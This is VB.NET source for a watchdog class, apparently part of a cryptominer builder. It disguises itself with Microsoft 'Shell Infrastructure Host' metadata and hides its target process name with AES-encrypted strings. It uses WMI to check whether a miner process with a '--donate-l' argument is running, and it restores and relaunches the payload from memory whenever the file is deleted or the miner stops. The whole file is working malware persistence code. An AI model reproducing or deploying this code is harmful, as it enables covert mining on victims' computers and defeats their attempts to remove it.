Imports System.Security.Cryptography
Imports Microsoft.Win32
Imports System.Management
Imports System
Imports System.Net.Sockets
Imports Microsoft.VisualBasic
Imports System.Diagnostics
Imports System.Reflection
Imports System.Runtime.InteropServices
Imports System.Collections.Generic
Imports System.Drawing
Imports System.Windows.Forms
Imports System.Net
Imports System.Drawing.Drawing2D
Imports System.Drawing.Imaging
Imports System.Threading
Imports System.Security
Imports System.Text

<Assembly: AssemblyTitle("Shell Infrastructure Host")>
<Assembly: AssemblyDescription("Shell Infrastructure Host")>
<Assembly: AssemblyProduct("Microsoft® Windows® Operating System")>
<Assembly: AssemblyCopyright("© Microsoft Corporation. All Rights Reserved.")>
<Assembly: AssemblyFileVersion("10.0.19041.746")>

Public Class Watchdog

    Public Shared xm As Byte() = New Byte() {}
    Public Shared plp As String = ""
    Public Shared checkcount As Integer = 0

    Public Shared Sub Main()
        Try
            plp = PayloadPath
            xm = System.IO.File.ReadAllBytes(plp)

            WDLoop()

        Catch ex As Exception
            Environment.Exit(0)
        End Try
    End Sub

    Public Shared Sub WDLoop()
        Try
            If Not CheckProc(GetString("#InjectionTarget"), "--donate-l") Then
                If Not System.IO.File.Exists(plp) Then
                    System.IO.File.WriteAllBytes(plp, xm)
                    Process.Start(plp)
                    Environment.Exit(0)
                Else
                    If checkcount < 2 Then
                        checkcount += 1
                    Else
                        checkcount = 0
                        Process.Start(plp)
                        Environment.Exit(0)
                    End If
                End If
            Else
                checkcount = 0
                If Not System.IO.File.Exists(plp) Then
                    System.IO.File.WriteAllBytes(plp, xm)
                    Process.Start(plp)
                    Environment.Exit(0)
                End If
            End If

            System.Threading.Thread.Sleep(10000)
            WDLoop()
        Catch ex As Exception
        End Try
    End Sub

    Public Shared Function GetString(ByVal input As String)
        Return Encoding.ASCII.GetString(AES_Decryptor(Convert.FromBase64String(input)))
    End Function

    Public Shared Function CheckProc(ByVal process As String, ByVal contains As String)
        On Error Resume Next
        Dim options As ConnectionOptions = New ConnectionOptions()
        options.Impersonation = ImpersonationLevel.Impersonate
        Dim scope As ManagementScope = New ManagementScope("\\" + Environment.UserDomainName + "\root\cimv2", options)
        scope.Connect()

        Dim wmiQuery As String = String.Format("Select CommandLine from Win32_Process where Name='{0}'", process)
        Dim query As ObjectQuery = New ObjectQuery(wmiQuery)
        Dim managementObjectSearcher As ManagementObjectSearcher = New ManagementObjectSearcher(scope, query)
        Dim managementObjectCollection As ManagementObjectCollection = managementObjectSearcher.Get()

        For Each retObject As ManagementObject In managementObjectCollection
            If retObject("CommandLine").ToString().Contains(contains) Then
                Return True
            End If
        Next
        Return False
    End Function

    Public Shared Function AES_Decryptor(ByVal input As Byte()) As Byte()
        Dim AES As New RijndaelManaged
        Dim Hash_ As New MD5CryptoServiceProvider
        Try
            Dim hash(31) As Byte
            Dim temp As Byte() = Hash_.ComputeHash(System.Text.Encoding.ASCII.GetBytes("#KEY"))
            Array.Copy(temp, 0, hash, 0, 16)
            Array.Copy(temp, 0, hash, 15, 16)
            AES.Key = hash
            AES.Mode = CipherMode.ECB
            Dim DESDecrypter As ICryptoTransform = AES.CreateDecryptor
            Dim Buffer As Byte() = input
            Return DESDecrypter.TransformFinalBlock(Buffer, 0, Buffer.Length)
        Catch ex As Exception
        End Try
    End Function
End Class
